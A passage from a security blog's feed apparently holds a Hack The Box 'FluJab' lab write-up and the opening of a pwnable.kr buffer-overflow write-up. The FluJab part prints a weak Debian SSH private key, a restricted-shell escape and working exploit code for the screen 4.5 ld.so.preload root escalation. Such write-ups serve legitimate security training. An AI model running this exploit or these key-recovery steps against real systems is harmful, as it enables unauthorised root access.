&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/102.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# shell whitelisting + key auth enabled 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-tried-cve-2008-0166-i-downloaded-the-files-from-here-then-i-extracted-them-in-a-directory-called-cve-2008-0166-then-i-used-grep-to-search-for-the-last-line-in-the-public-key--yv8c1uai3lunrsh9rxfnox1rtz73ucmgtbacomvqy9mpi96rizm2qbe26v1mxiqnktu03cbne8tdd96txonmaxe-through-all-files-&quot;&gt;I tried &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2008-0166&lt;/code&gt;&lt;/a&gt;. I downloaded the files from &lt;a href=&quot;https://github.com/g0tmi1k/debian-ssh&quot;&gt;here&lt;/a&gt; then I extracted them in a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;cve-2008-0166&lt;/code&gt;. Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; to search for the last line in the public key : &lt;code class=&quot;highlighter-rouge&quot;&gt;Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE&lt;/code&gt; through all files :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;grep -r -n &quot;Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE&quot; cve-2008-0166/*&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/103.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-matched-this-public-key--debian_ssh_rsa_4096_x86rsa4096dead0b5b829ea2e3d22f47a7cbde17a6-23269pub-so-i-grabbed-the-private-key--dead0b5b829ea2e3d22f47a7cbde17a6-23269-and-used-it-to-get-ssh&quot;&gt;It matched this public key : &lt;code class=&quot;highlighter-rouge&quot;&gt;debian_ssh_rsa_4096_x86/rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub&lt;/code&gt; so I grabbed the private key : &lt;code class=&quot;highlighter-rouge&quot;&gt;dead0b5b829ea2e3d22f47a7cbde17a6-23269&lt;/code&gt; and used it to get ssh.&lt;/h4&gt;
&lt;h4 id=&quot;dead0b5b829ea2e3d22f47a7cbde17a6-23269-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dead0b5b829ea2e3d22f47a7cbde17a6-23269&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/104.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bypassing-restricted-bash-local-privilege-escalation-vulnerability-in-screen-root-flag&quot;&gt;Bypassing restricted bash, Local Privilege Escalation Vulnerability in screen, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-ssh-access-i-found-myself-in-rbash-&quot;&gt;After getting ssh access I found myself in &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/105.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-trying-some-stuff-i-could-bypass-it-by-adding-the--t-option-when-trying-to-ssh-&quot;&gt;After trying some stuff I could bypass it by adding the &lt;code class=&quot;highlighter-rouge&quot;&gt;-t&lt;/code&gt; option when trying to ssh :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@flujab.htb -t &quot;bash --noprofile&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/106.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-had-to-fix-my-path-&quot;&gt;Then I had to fix my path :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/107.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-did-some-regular-enumeration-steps-one-of-them-is-searching-for-suid-binaries-&quot;&gt;I did some regular enumeration steps, one of them is searching for &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binaries :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm -4000 2&amp;gt;/dev/null&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/108.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;one-thing-that-caught-my-attention-was-usrlocalsharescreenscreen&quot;&gt;One thing that caught my attention was &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/share/screen/screen&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-checked-the-version-of-screen-&quot;&gt;I checked the version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;screen -v&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/109.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-version-45-which-is-vulnerable-to-a-local-privilege-escalation-vulnerability-and-theres-a-published-exploit-for-it-here-however-by-looking-at-that-exploit-&quot;&gt;It was version 4.5 which is vulnerable to a Local Privilege Escalation Vulnerability and there’s a published exploit for it &lt;a href=&quot;https://www.exploit-db.com/exploits/41154&quot;&gt;here&lt;/a&gt;. However by looking at that exploit :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/110.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-see-that-its-compiling-stuff-and-unfortunately-gcc-wasnt-installed-on-the-machine-&quot;&gt;We can see that it’s compiling stuff. And unfortunately &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt; wasn’t installed on the machine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/111.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-had-to-remove-the-c-code-from-the-exploit-and-create-separate-files-then-i-compiled-them&quot;&gt;So I had to remove the &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; code from the exploit and create separate files. Then I compiled them.&lt;/h4&gt;
&lt;h4 id=&quot;libhaxc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;libhax.c&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
__attribute__ ((__constructor__))
void dropshell(void){
    chown(&quot;/tmp/rootshell&quot;, 0, 0);
    chmod(&quot;/tmp/rootshell&quot;, 04755);
    unlink(&quot;/etc/ld.so.preload&quot;);
    printf(&quot;[+] done!\n&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;rootshellc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rootshell.c&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp(&quot;/bin/sh&quot;, NULL, NULL);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;compilation-&quot;&gt;Compilation :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fPIC -shared -ldl -o libhax.so libhax.c&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o rootshell rootshell.c&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;exploitsh-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit.sh&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
screen &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# newline needed&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Triggering...&quot;&lt;/span&gt;
screen &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 
/tmp/rootshell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-a-python-server-to-host-the-compiled-binaries-and-the-exploit-script-then-i-downloaded-them-on-the-machine-&quot;&gt;I ran a python server to host the compiled binaries and the exploit script. Then I downloaded them on the machine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/112.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-when-i-ran-the-exploit-it-didnt-spawn-a-root-shell-&quot;&gt;But when I ran the exploit it didn’t spawn a root shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/113.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-because-i-forgot-that-the-suid-version-of-screen-was-in-usrlocalsharescreenscreen-the-other-one-had-problems-and-didnt-even-start-&quot;&gt;That’s because I forgot that the &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; was in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/share/screen/screen&lt;/code&gt;. The other one had problems and didn’t even start :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/114.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-edited-the-path-in-the-exploit-code-&quot;&gt;So I edited the path in the exploit code :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/115.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
/usr/local/share/screen/screen &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# newline needed&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Triggering...&quot;&lt;/span&gt;
/usr/local/share/screen/screen &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 
/tmp/rootshell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/116.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---help&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/help/&quot;&gt;Hack The Box - Help&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="SQLI" /><category term="ssh" /><category term="rbash" /><category term="Binary Exploitation" /><category term="c" /><summary type="html">Quick Summary Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting SQL injection vulnerability. Ajenti administration panel was installed on the box and I could get credentials for it by exploiting the SQLi, After that I could use a user’s public ssh key to get the private key as it was vulnerable to CVE-2008-0166 then I escaped rbash and exploited a vulnerable version of screen to get a root shell. It’s a Linux box and its ip is 10.10.10.124, I added it to /etc/hosts as flujab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC flujab.htb We got ssh on port 22, http on ports 80 and 8080 and https on port 443. There’s also some sort of virtual hosting as we can see from the nmap scan and there are a lot of domains … We can also check the ssl certificate manually : HTTP I added all of them to /etc/hosts and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have : The machine name is flujab so we are only interested in : console.flujab.htb sys.flujab.htb smtp.flujab.htb freeflujab.htb flujab.htb We saw that error about direct ip access when we visited flujab.htb, Let’s check the other 4. console.flujab.htb : Just a troll ! sys.flujab.htb : The same error on flujab.htb smtp.flujab.htb : We don’t have any credentials for that. freeflujab.htb : That one is interesting. I tried to run gobuster but there was a wildcard response. When I checked manually I found that instead of responding with 404 it responds with a redirection to https://clownware.htb/cwerror_pages.php which has a gif of a strange creepy clown … Note : I checked them all on port 8080 too but I always got the direct ip access error. I started burp and configured the scope : Then I ran the spider : Results : I checked the requests and the responses of different pages and actions. I noticed in one of the responses a Set-Cookie header that sets a cookie called Modus and sets the path for it to /?smtp_config. I requested /?smtp_config in the browser and looked at the request in burp : Request : Response : The response was a redirection to /?denied. We are sending 3 cookies in every request : Modus , Patient and Registered. Modus and Registered are base-64 encoded strings while Patient is an md5 hash. Modus = Configure=Null Registered = f991b5fb6a2939471c7230b2db78225e=Null Registered is using the same hash from Patient, After some guesses I found that this hash is for my ip : Anyway we can try to change these values from Null to True and see what happens : Request : GET /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Response : HTTP/1.1 200 OK Date: Thu, 15 Jun 2019 10:34:17 GMT Content-Type: text/html; charset=UTF-8 Connection: close Server: ClownWare Proxy Content-Length: 3735 Great, we can access the page now. Before doing anything I noticed this message about the whitelist: I requested /?whitelist and looked at the response : My ip wasn’t there. Anyway I used python to run a debugging smtp server : python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25 Then I went to update the smtp settings and add mine : But I got this message : A Valid SMTP Domain Address Is Required. So I checked the source of the form : &amp;lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&amp;gt; &amp;lt;div class=&quot;row aln-center&quot;&amp;gt; &amp;lt;div class=&quot;col-6 &quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div class=&quot;col-12&quot;&amp;gt; &amp;lt;p&amp;gt; WARNING: Only &amp;lt;a href=&quot;/?whitelist&quot;&amp;gt;whitelisted sysadmins&amp;lt;/a&amp;gt; are authorized to access this page! &amp;lt;br \&amp;gt; If you are not supposed to change these settings then don't! whitelist will be auto-updated. &amp;lt;/p&amp;gt; &amp;lt;ul class=&quot;actions&quot;&amp;gt; &amp;lt;li&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/form&amp;gt; It’s relying on client-side validation check : Which means that we can bypass it easily by sending the data directly in the request : Request : ``` POST /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 59</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/flujab/0.png" /></entry><entry><title type="html">pwnable.kr - bof</title><link href="http://localhost:4000/pwn/bof/" rel="alternate" type="text/html" title="pwnable.kr - bof" /><published>2019-06-10T00:00:00+02:00</published><updated>2019-06-10T00:00:00+02:00</updated><id>http://localhost:4000/pwn/bof</id><content type="html" xml:base="http://localhost:4000/pwn/bof/">&lt;hr /&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-its-been-a-long-time-since-my-first-pwn-write-up--today-ill-write-about-another-challenge-from-pwnablekr-called-bof-it-was-a-simple-easy-buffer-overflow-challenge-you-can-also-check-these-by-overwriting-a-variable-we-can-get-a-shell-ill-also-write-a-small-exploit-with-pwntools-that-spawns-a-shell-automatically&quot;&gt;Hey guys it’s been a long time since my &lt;a href=&quot;https://0xrick.github.io/pwn/fd/&quot;&gt;first pwn write-up&lt;/a&gt;,  today I’ll write about another challenge from &lt;a href=&quot;https://pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; called bof. It was a simple easy buffer overflow challenge (You can also check &lt;a href=&quot;/categories/#binary-exploitation&quot;&gt;these&lt;/a&gt;), by overwriting a variable we can get a shell. I’ll also write a small exploit with &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; that spawns a shell automatically.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
